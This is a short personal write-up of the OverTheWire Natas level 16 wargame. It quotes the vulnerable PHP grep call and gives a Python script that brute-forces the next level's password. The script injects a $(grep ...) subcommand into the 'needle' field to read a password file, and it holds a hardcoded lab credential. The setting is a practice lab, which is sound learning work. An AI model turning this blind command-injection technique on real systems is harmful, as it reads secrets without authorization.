
2024-07-19 21:01

Source: #overthewire #natas 

Tags: 

 ```
passthru("grep -i \"$key\" dictionary.txt");  # snippet form website source code
```
the key argument is passed in double quotes so it is isolated as its own argument we can't get around that
we can't directly use `$(whoami)` to run commands because the command's output is used as a input for the grep command which is searching in the dictionary 

if we only send in `B` as input because `B` does exist in the password that grep command in the PHP code is filled in with the actual password an argument and it obviously can't find that in dictionary text so we don't see any output here

```
import requests
import re
import string

characters = string.ascii_letters+"0123456789"

username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

url = 'http://natas16.natas.labs.overthewire.org/?debug=true'
sessions = requests.Session()
seen = list()

while(len(seen) < 32):
    for ch in characters:
        print("".join(seen)+ch)
        
        response = sessions.post(url,data = {"needle": "anythings$(grep ^" + "".join(seen) + ch + "  /etc/natas_webpass/natas17)"},auth = (username,password))

        content = response.text
        returned = re.findall('<pre>\n(.*)\n</pre>',content)

        if not returned:
            seen.append(ch)
            break
```
### References
